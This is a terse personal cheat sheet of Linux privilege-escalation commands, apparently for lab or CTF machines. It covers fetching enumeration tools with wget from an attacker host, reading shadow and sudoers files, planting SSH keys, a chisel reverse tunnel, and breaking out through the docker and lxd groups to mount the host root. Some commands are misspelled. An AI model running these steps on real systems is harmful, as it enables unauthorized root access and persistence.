#linpriv #linux #cheetsheet  

sudo -l  
-----------------------------------Automated Tools
 
- [ ] wget [http://10.10.14.11:9999/linpeas.sh](http://10.10.14.11:9999/linpeas.sh)  
wget [http://10.10.14.11:9999/LinEnum.sh](http://10.10.14.11:9999/LinEnum.sh)  
-----------------------------------Weak file Perm  
- [ ] /etc/passwd  
- [ ] /etc/shadow  
- [ ] /etc/sudoers  
- [ ] Cheack if you have read and write permissions
 
-----------------------------------Cron Jobs
 
- [ ] cat /etc/crontab  
- [ ] /etc/crowntabd  
- [ ] wget [http://10.10.14.11:9999/pspy64](http://10.10.14.11:9999/pspy64)  
- [ ] ./pspy64
 
------------------------------------SUID perm
 
- [ ] find / -type f -perm -4000 2>/dev/null
- [ ] GTFO bins
 
------------------------------------Capabilities
 
- [ ] getcap -r / 2>/dev/null
 
------------------------------------Network File Share
 
- [ ] cat /etc/exports  
- [ ] shoemount -e ip
 
------------------------------------SSh keys,History files and config files
 
cat .bash_history  
cat config files  
Inside the machine we have hacked we are generating a public ssh key which will give me a ssh shell  
ssh-keygen -t rsa  
cd /home/user/.ssh  
nano idpub.rsa //copy the key  
nano authorized_keys //paste the key  
ssh user@10.10.29.167 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAccepted  
chmod 600 id_rsa
 
--------------------------------------Kernal Exploits
 
uname -r
 
---------------------------------------Process Hijacking
 
ps -aux
 
--------------------------------------Port Forwarding
 
netstat -plant  
wget [http://10.10.13.25:9999/chisel](http://10.10.13.25:9999/chisel)  
./chisel client 10.17.66.176:9001 R:3333:127.0.0.1:6666  
./chisel server --reverse --port 9001

![[../../../attchments/Exported image 20241213144602-0.png|Exported image]]  

----------------------------------------User Groups
 
We will take advantages of two groups 1.docker 2.lxd  
id  
----docker
 
docker image ls  
Using this command we are checking if there is an image if not we have to download it  
docker run -it bash sh  
docker run -v /:/mnt -it bash sh
 
----lxd
 
lxc image list

![[../../../attchments/Exported image 20241213144604-1.png|Exported image]]  
![[../../../attchments/Exported image 20241213144606-2.png|Exported image]]  
![[../../../attchments/Exported image 20241213144608-3.png|Exported image]]

lxc image import ./alpine.tar.gz --alias alpineimg  
lxc image list  
lxc init alpineimg alpinecon -c security.privileged=true  
lxc config device add alpinecon mydevice disk source=/ path=/  
lxc start alpinecon  
lxc exe alpinecon /bin/sh